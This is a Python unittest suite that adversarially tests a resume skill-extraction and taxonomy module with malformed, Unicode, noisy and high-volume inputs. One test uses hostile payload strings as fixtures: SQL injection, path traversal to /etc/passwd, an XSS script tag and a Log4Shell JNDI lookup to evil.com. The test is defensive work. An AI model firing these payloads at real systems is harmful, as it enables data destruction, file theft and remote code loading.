"""
test_skill_taxonomy_adversarial.py — Empirical Adversarial Stress Test Suite
─────────────────────────────────────────────────────────────────────────────
Adversarially tests `skill_taxonomy.py` and `skills_extractor.py` against:
1. Malformed inputs, non-string types, nulls, booleans, containers
2. Regex injection strings, SQL injection, path traversal, shell meta-characters
3. Unicode anomalies, emojis, zero-width spaces, RTL Arabic, Cyrillic homoglyphs
4. Punctuation edge cases, exotic delimiters, category headers, parentheticals
5. Mutation safety & immutability of returned taxonomy lists
6. Domain filtering invariants: zero leakage of unmentioned domains or subtopics
7. Subtopic isolation: subtopic-only mention vs umbrella-skill mention
8. False friends & noisy resumes ("eating an Apple while running Docker in AWS")
9. High-volume stress testing (100KB+ payloads, 50,000 tokens, 1,000 rapid queries)
"""

import os
import sys
import time
import unittest

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
VENV_SITE = os.path.join(PROJECT_ROOT, "venv", "Lib", "site-packages")
if os.path.exists(VENV_SITE) and VENV_SITE not in sys.path:
    sys.path.insert(0, VENV_SITE)

if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

ML_SERVICES_DIR = os.path.join(PROJECT_ROOT, "ml-services")
if ML_SERVICES_DIR not in sys.path:
    sys.path.insert(0, ML_SERVICES_DIR)

from extraction.skill_taxonomy import (
    SKILL_TAXONOMY,
    SKILL_ALIASES,
    get_subtopics,
    get_domain,
    get_all_skills_flat,
    get_canonical_skill,
    get_parent_skill,
)
from extraction.skills_extractor import extract_skill, SKILL_PATTERNS


class TestTaxonomyMalformedInputs(unittest.TestCase):
    """Vector 1: Malformed inputs, non-string types, and injection strings."""

    def test_non_string_inputs_to_all_taxonomy_helpers(self):
        """All taxonomy helper functions must gracefully handle non-string inputs."""
        non_string_inputs = [
            None,
            123,
            0,
            -42,
            3.14159,
            True,
            False,
            [],
            [1, 2, 3],
            {"skill": "DSA"},
            {"DSA"},
            object(),
            b"bytes_skill",
        ]
        for val in non_string_inputs:
            with self.subTest(val=val):
                self.assertEqual(get_subtopics(val), [], f"get_subtopics failed on {val}")
                self.assertEqual(get_domain(val), "", f"get_domain failed on {val}")
                self.assertEqual(get_canonical_skill(val), "", f"get_canonical_skill failed on {val}")
                self.assertEqual(get_parent_skill(val), "", f"get_parent_skill failed on {val}")

    def test_whitespace_and_null_bytes(self):
        """Empty, whitespace-only, and null-byte-laden inputs."""
        whitespace_cases = ["", "   ", "\t", "\n", "\r\n", "   \t\n  "]
        for s in whitespace_cases:
            with self.subTest(s=repr(s)):
                self.assertEqual(get_subtopics(s), [])
                self.assertEqual(get_domain(s), "")
                self.assertEqual(get_canonical_skill(s), "")
                self.assertEqual(get_parent_skill(s), "")

        # Padded skills with whitespace should still resolve correctly
        self.assertEqual(get_domain("   Python   \n"), "Programming Languages")
        self.assertEqual(get_canonical_skill("\tDSA\t"), "DSA")
        self.assertIn("Array", get_subtopics("\n\nDSA  "))

    def test_regex_injection_strings(self):
        """Regex meta-characters must not cause ReDoS, crash, or syntax errors."""
        regex_injections = [
            "(.*)+",
            "[a-zA-Z0-9]+",
            "(?<=foo)bar",
            "(?i)python",
            "^$",
            "\\",
            "\\\\",
            "(?:[a-z]+)*",
            "a{1,100000}",
            "+*?{}",
            "[",
            "]",
            "(",
            ")",
            "(?!)",
        ]
        for inj in regex_injections:
            with self.subTest(inj=inj):
                self.assertEqual(get_subtopics(inj), [])
                self.assertEqual(get_domain(inj), "")
                self.assertEqual(get_canonical_skill(inj), "")
                self.assertEqual(get_parent_skill(inj), "")

    def test_sql_injection_and_path_traversal(self):
        """SQL injection and path traversal payloads must safely return empty/defaults."""
        malicious = [
            "' OR '1'='1",
            "'; DROP TABLE skills; --",
            "UNION SELECT * FROM users",
            "../../../../etc/passwd",
            "..\\..\\Windows\\System32\\cmd.exe",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        for payload in malicious:
            with self.subTest(payload=payload):
                self.assertEqual(get_subtopics(payload), [])
                self.assertEqual(get_domain(payload), "")
                self.assertEqual(get_canonical_skill(payload), "")
                self.assertEqual(get_parent_skill(payload), "")


class TestTaxonomyMutationSafety(unittest.TestCase):
    """Vector 2: Immutability and Mutation Safety."""

    def test_get_subtopics_mutation_isolation(self):
        """Mutating the list returned by get_subtopics must NEVER mutate internal SKILL_TAXONOMY."""
        original_dsa = get_subtopics("DSA")
        self.assertIn("Array", original_dsa)
        original_len = len(original_dsa)

        # Attempt destructive mutations on returned list
        leak_list = get_subtopics("DSA")
        leak_list.append("HACKED_SUBTOPIC")
        leak_list.extend(["FOO", "BAR"])
        leak_list.insert(0, "INJECTED_TOPIC")

        # Verify second call is unaffected
        fresh_dsa = get_subtopics("DSA")
        self.assertEqual(len(fresh_dsa), original_len)
        self.assertNotIn("HACKED_SUBTOPIC", fresh_dsa)
        self.assertNotIn("INJECTED_TOPIC", fresh_dsa)

        # Attempt clearing and popping
        leak_list_2 = get_subtopics("DSA")
        leak_list_2.clear()

        # Verify third call is still intact
        fresh_dsa_2 = get_subtopics("DSA")
        self.assertEqual(fresh_dsa_2, original_dsa)

        # Verify underlying SKILL_TAXONOMY dict was not altered
        raw_subtopics = SKILL_TAXONOMY["Core CS & Foundations"]["DSA"]
        self.assertEqual(raw_subtopics, original_dsa)

    def test_get_all_skills_flat_mutation_isolation(self):
        """Mutating the list returned by get_all_skills_flat must not alter subsequent calls."""
        flat_1 = get_all_skills_flat()
        original_len = len(flat_1)

        flat_1.clear()
        flat_1.append("CORRUPTED")

        flat_2 = get_all_skills_flat()
        self.assertEqual(len(flat_2), original_len)
        self.assertNotIn("CORRUPTED", flat_2)


class TestDomainFilteringInvariants(unittest.TestCase):
    """Vector 3: Domain Filtering & Zero Leakage Invariants."""

    def test_empty_and_pure_noise_yield_empty_by_domain(self):
        """Empty string or non-technical text must yield strictly empty by_domain."""
        res_empty = extract_skill("")
        self.assertEqual(res_empty["by_domain"], {})
        self.assertEqual(res_empty["high"], [])
        self.assertEqual(res_empty["medium"], [])

        res_noise = extract_skill("Yesterday the sun was shining and the birds were singing in the park.")
        self.assertEqual(res_noise["by_domain"], {})
        self.assertEqual(res_noise["high"], [])
        self.assertEqual(res_noise["medium"], [])

    def test_single_skill_no_domain_leakage(self):
        """Extracting a single skill must ONLY populate that skill's exact domain."""
        res_python = extract_skill("Python")
        self.assertEqual(set(res_python["by_domain"].keys()), {"Programming Languages"})
        self.assertEqual(set(res_python["by_domain"]["Programming Languages"].keys()), {"Python"})

        res_docker = extract_skill("Docker")
        self.assertEqual(set(res_docker["by_domain"].keys()), {"Cloud & DevOps"})
        self.assertEqual(set(res_docker["by_domain"]["Cloud & DevOps"].keys()), {"Docker"})

        res_dsa = extract_skill("DSA")
        self.assertEqual(set(res_dsa["by_domain"].keys()), {"Core CS & Foundations"})
        self.assertEqual(set(res_dsa["by_domain"]["Core CS & Foundations"].keys()), {"DSA"})

    def test_multi_skill_exact_domains_only(self):
        """Skills spanning exactly N domains must produce exactly N domains in by_domain."""
        # 3 domains: Programming Languages (Python), Cloud & DevOps (Docker), Databases & Storage (PostgreSQL)
        res = extract_skill("Python, Docker, PostgreSQL")
        expected_domains = {"Programming Languages", "Cloud & DevOps", "Databases & Storage"}
        self.assertEqual(set(res["by_domain"].keys()), expected_domains)

        # None of the other 6 domains may be present
        unmentioned_domains = {
            "Core CS & Foundations",
            "Frontend Web Development",
            "Backend Web Development",
            "AI, ML & Data Science",
            "Mobile Development",
            "Software Engineering & Practices",
        }
        for d in unmentioned_domains:
            self.assertNotIn(d, res["by_domain"])

    def test_subtopic_only_isolation_invariant(self):
        """
        CRITICAL INVARIANT:
        When only a subtopic (e.g. 'Array') is mentioned, by_domain must NOT leak
        all other unmentioned subtopics (like 'Dynamic Programming', 'Graph', 'Tree').
        It must contain ONLY the detected subtopic ['Array'].
        """
        res = extract_skill("Array")
        self.assertIn("Core CS & Foundations", res["by_domain"])
        self.assertIn("DSA", res["by_domain"]["Core CS & Foundations"])
        dsa_subs = res["by_domain"]["Core CS & Foundations"]["DSA"]

        # Must contain only Array
        self.assertEqual(dsa_subs, ["Array"])
        self.assertNotIn("Dynamic Programming", dsa_subs)
        self.assertNotIn("Graph", dsa_subs)
        self.assertNotIn("Tree", dsa_subs)

    def test_umbrella_skill_provides_full_taxonomy_subtopics(self):
        """
        When the umbrella skill itself ('DSA') is mentioned, by_domain must expand
        to provide all 21 core algorithmic topics.
        """
        res = extract_skill("DSA")
        self.assertIn("Core CS & Foundations", res["by_domain"])
        self.assertIn("DSA", res["by_domain"]["Core CS & Foundations"])
        dsa_subs = res["by_domain"]["Core CS & Foundations"]["DSA"]

        self.assertIn("Array", dsa_subs)
        self.assertIn("Dynamic Programming", dsa_subs)
        self.assertIn("Binary Search", dsa_subs)
        self.assertGreaterEqual(len(dsa_subs), 15)


class TestFalseFriendsAndNoisyResumes(unittest.TestCase):
    """Vector 4: False Friends, Noisy Texts, and Cross-Section Prioritization."""

    def test_apple_and_python_false_friend(self):
        """
        Sentence: 'I am a Python developer who eats an Apple while running Docker in AWS'
        Must extract: Python, Docker, AWS.
        Must NOT extract: Apple, developer, eats, running.
        """
        sentence = "I am a Python developer who eats an Apple while running Docker in AWS"
        res = extract_skill(sentence)

        detected = set(res["high"]) | set(res["medium"])
        self.assertIn("Python", detected)
        self.assertIn("Docker", detected)
        self.assertIn("AWS", detected)

        self.assertNotIn("Apple", detected)
        self.assertNotIn("developer", detected)
        self.assertNotIn("eats", detected)

        # Check domains
        expected_domains = {"Programming Languages", "Cloud & DevOps"}
        self.assertEqual(set(res["by_domain"].keys()), expected_domains)

    def test_cross_section_priority_ranking(self):
        """Skills in both sections are 'high'; skills in only one section are 'medium'."""
        skills_text = "Python, DSA, Docker, AWS"
        projects_text = "Designed an ETL service using Python and Docker on Kubernetes."

        res = extract_skill(skills_text, projects_text)

        # High: in both skills and projects
        self.assertIn("Python", res["high"])
        self.assertIn("Docker", res["high"])

        # Medium: in only one section
        self.assertIn("DSA", res["medium"])
        self.assertIn("AWS", res["medium"])
        self.assertIn("Kubernetes", res["medium"])

        self.assertNotIn("DSA", res["high"])
        self.assertNotIn("Kubernetes", res["high"])

    def test_narrative_false_friends_isolation(self):
        """
        General English words that happen to be subtopics (e.g. 'Tree', 'Queue')
        should be captured as medium if mentioned in narrative, but must NOT leak
        all unmentioned subtopics into by_domain.
        """
        text = "I waited in a queue near an oak tree to buy a coffee"
        res = extract_skill(text)

        # DSA should contain only ['Queue', 'Tree'], not the full 21 subtopics
        self.assertIn("Core CS & Foundations", res["by_domain"])
        subs = res["by_domain"]["Core CS & Foundations"]["DSA"]
        self.assertEqual(set(subs), {"Queue", "Tree"})
        self.assertNotIn("Dynamic Programming", subs)
        self.assertNotIn("Sorting", subs)


class TestPunctuationAndFormatAnomalies(unittest.TestCase):
    """Vector 5: Punctuation, Delimiters, Casing, and Formatting Variations."""

    def test_exotic_bullet_delimiters(self):
        """Extracts properly across bullets (•, ●, ○, ▪, ▸, ►, ◆), pipes, and semicolons."""
        text = "● Python ○ DSA ▪ Docker ▸ React ► FastAPI ◆ PostgreSQL; Kubernetes | AWS"
        res = extract_skill(text)
        detected = set(res["high"]) | set(res["medium"])

        for skill in ["Python", "DSA", "Docker", "React", "FastAPI", "PostgreSQL", "Kubernetes", "AWS"]:
            self.assertIn(skill, detected, f"Failed to extract {skill} with exotic delimiters")

    def test_slashed_and_punctuated_skills(self):
        """Skills with internal slashes or symbols: CI/CD, TCP/IP, HTML/CSS, C++, C#, .NET."""
        text = "CI/CD, TCP/IP, HTML/CSS, C++, C#, .NET, Node.js"
        res = extract_skill(text)
        detected = set(res["high"]) | set(res["medium"])

        for s in ["CI/CD", "TCP/IP", "HTML/CSS", "C++", "C#", ".NET", "Node.js"]:
            self.assertIn(s, detected, f"Failed to extract slashed skill: {s}")

    def test_parenthetical_tech_stacks(self):
        """Tech stacks formatted as 'Python (FastAPI, Django), C++ (STL)'."""
        text = "Languages: Python (FastAPI, Django), C++ (STL)"
        res = extract_skill(text)
        detected = set(res["high"]) | set(res["medium"])

        for s in ["Python", "FastAPI", "Django", "C++", "STL"]:
            self.assertIn(s, detected, f"Failed to extract parenthetical skill: {s}")

    def test_chaotic_casing_normalization(self):
        """Casing variations normalize to proper canonical display names."""
        text = "pYtHoN, dSa, OoPs, dOcKeR, k8S, pOsTgReSqL"
        res = extract_skill(text)
        detected = set(res["high"]) | set(res["medium"])

        # Display names must be normalized
        self.assertIn("Python", detected)
        self.assertIn("DSA", detected)
        self.assertIn("OOPS", detected)
        self.assertIn("Docker", detected)
        self.assertIn("K8s", detected)
        self.assertIn("PostgreSQL", detected)

    def test_unicode_and_emojis(self):
        """Emojis, Arabic RTL, and Cyrillic script alongside skills."""
        text = "🐍 Python 🚀 | 💻 Docker 🐳 | ⚡ FastAPI | بايثون Python دوكر Docker"
        res = extract_skill(text)
        detected = set(res["high"]) | set(res["medium"])

        self.assertIn("Python", detected)
        self.assertIn("Docker", detected)
        self.assertIn("FastAPI", detected)


class TestStressAndVolumePerformance(unittest.TestCase):
    """Vector 6: Stress, High-Volume Payloads, and Throughput Benchmarks."""

    def test_rapid_taxonomy_helper_throughput(self):
        """1,000 rapid taxonomy helper lookups must finish in under 100ms."""
        skills_sample = ["DSA", "dsa", "OOP", "OOPS", "Python", "Docker", "AWS", "Unknown", None, ""]
        t0 = time.perf_counter()
        for _ in range(100):
            for s in skills_sample:
                _ = get_subtopics(s)
                _ = get_domain(s)
                _ = get_canonical_skill(s)
                _ = get_parent_skill(s)
        duration = time.perf_counter() - t0
        self.assertLess(
            duration, 0.200,
            f"1,000 taxonomy lookups took {duration:.4f}s (exceeded 200ms threshold)"
        )

    def test_massive_resume_payload(self):
        """Extracting skills from a massive 100KB resume payload runs without crash or hang."""
        chunk = """
        Technical Skills:
        - Languages: Python, Java, C++, JavaScript, TypeScript, Go, Rust, SQL
        - Frameworks: FastAPI, Django, Flask, React, Next.js, Angular, Node.js
        - Cloud & DevOps: Docker, Kubernetes, AWS, Terraform, CI/CD, Linux
        - Databases: PostgreSQL, MySQL, MongoDB, Redis, Cassandra
        - CS Fundamentals: DSA, OOP, System Design, Operating Systems, DBMS
        """
        large_payload = chunk * 200  # ~100KB text
        self.assertGreater(len(large_payload), 80000)

        t0 = time.perf_counter()
        res = extract_skill(large_payload)
        duration = time.perf_counter() - t0

        self.assertLess(
            duration, 5.0,
            f"100KB extraction took {duration:.3f}s (exceeded 5.0s budget)"
        )
        detected = set(res["high"]) | set(res["medium"])
        self.assertIn("Python", detected)
        self.assertIn("Docker", detected)
        self.assertIn("FastAPI", detected)
        self.assertIn("DSA", detected)
        self.assertGreaterEqual(len(res["by_domain"]), 5)


class TestExtractorInputDefensiveness(unittest.TestCase):
    """Vector 7: Extractor Input Defensiveness on None and Non-string types."""

    def test_none_input_defensiveness(self):
        """extract_skill(None) and extract_skill(None, None) must safely return empty structures."""
        res1 = extract_skill(None)
        self.assertEqual(res1, {"high": [], "medium": [], "by_domain": {}})

        res2 = extract_skill(None, None)
        self.assertEqual(res2, {"high": [], "medium": [], "by_domain": {}})

    def test_substring_boundary_isolation(self):
        """Substring skills must not falsely trigger parent/child skills (e.g. Java vs JavaScript)."""
        res_js = extract_skill("I develop modern web applications with JavaScript")
        detected_js = set(res_js["high"]) | set(res_js["medium"])
        self.assertIn("JavaScript", detected_js)
        self.assertNotIn("Java", detected_js)

        res_rn = extract_skill("Built cross platform apps in React Native")
        detected_rn = set(res_rn["high"]) | set(res_rn["medium"])
        self.assertIn("React Native", detected_rn)
        self.assertNotIn("React", detected_rn)

        res_cpp = extract_skill("Low level systems programming with C++")
        detected_cpp = set(res_cpp["high"]) | set(res_cpp["medium"])
        self.assertIn("C++", detected_cpp)
        self.assertNotIn("C#", detected_cpp)

    def test_projects_only_input_extraction(self):
        """When skills_text is empty and projects_text has skills, all go to medium priority."""
        res = extract_skill("", "Implemented scalable microservices with Python, FastAPI, and PostgreSQL.")
        self.assertEqual(res["high"], [])
        self.assertIn("Python", res["medium"])
        self.assertIn("FastAPI", res["medium"])
        self.assertIn("PostgreSQL", res["medium"])
        self.assertIn("Microservices", res["medium"])
        # Microservices is in System Design under Core CS & Foundations
        expected_domains = {
            "Programming Languages",
            "Backend Web Development",
            "Databases & Storage",
            "Core CS & Foundations",
        }
        self.assertEqual(set(res["by_domain"].keys()), expected_domains)
        self.assertIn("System Design", res["by_domain"]["Core CS & Foundations"])
        self.assertEqual(res["by_domain"]["Core CS & Foundations"]["System Design"], ["Microservices"])


if __name__ == "__main__":
    unittest.main()

